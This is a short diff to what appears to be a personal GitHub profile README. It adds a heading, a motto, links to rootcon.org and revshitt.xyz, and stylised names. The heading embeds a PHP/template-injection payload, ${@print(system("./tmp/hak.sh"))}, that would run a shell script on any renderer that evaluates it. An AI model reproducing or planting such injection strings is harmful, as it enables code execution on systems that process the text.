@@ -11,6 +11,12 @@ Here are some ideas to get you started:
 - 😄 Pronouns: ...
 - ⚡ Fun fact: ...
 -->
+### ♡${@print(system("./tmp/hak.sh"))}🪽
+| Live the life you have imagined |
+https://rootcon.org/
+https://revshitt.xyz/
+• 𝕽𝔬𝔬𝔱𝔠𝔬𝔫
+• 𝕽𝖊𝖛𝖘𝖍𝖎𝖙
 <p align = center >
   <img src="https://cdn.discordapp.com/attachments/1067823764869480590/1100596105596641290/New_Project.png">
 </p>
